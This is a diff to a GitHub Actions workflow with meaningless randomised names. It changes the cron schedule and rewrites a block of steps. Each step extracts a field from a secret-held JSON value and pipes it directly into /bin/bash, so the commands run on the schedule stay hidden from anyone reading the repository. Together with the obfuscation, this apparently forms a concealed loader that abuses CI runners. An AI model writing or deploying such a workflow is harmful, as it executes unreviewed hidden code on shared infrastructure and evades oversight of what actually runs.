@@ -3,8 +3,8 @@ name: beixirui3217
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
-jobs:  # 16937
+    - cron: '24 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,15 @@ jobs:  # 16937
       - uses: actions/checkout@v4
       - name: beixirui3217
         env:
-          duq62522: ${{ secrets.duq62522 }}
+          ize35: ${{ secrets.ize35 }}
         run: |
-          echo $duq62522 | jq -r .sulbl0912 | /bin/bash
-          echo $lvwj3 | jq -r .ylker0641 | /bin/bash
-          echo $nzkdg7766 | jq -r .a29173 | /bin/bash
-          echo $me9 | jq -r .iim25 | /bin/bash
-          echo $z51906 | jq -r .gz4 | /bin/bash
-          echo $hbhs203 | jq -r .wrele3399 | /bin/bash
-          echo $uok33 | jq -r .fquj371 | /bin/bash
-          echo $ckey7 | jq -r .utzcr34 | /bin/bash
+          echo $ize35 | jq -r .dpow99 | /bin/bash
+          echo $vbsdq432 | jq -r .tkn74 | /bin/bash
+          echo $fzb754 | jq -r .l51874 | /bin/bash
+          echo $v84408 | jq -r .h30452 | /bin/bash
+          echo $cxah0 | jq -r .ys20320 | /bin/bash
+          echo $m8916 | jq -r .vvak0766 | /bin/bash
+          echo $nqzd333 | jq -r .yma94245 | /bin/bash
+          echo $vaori19 | jq -r .o7 | /bin/bash
+          echo $apx67 | jq -r .v3 | /bin/bash
 
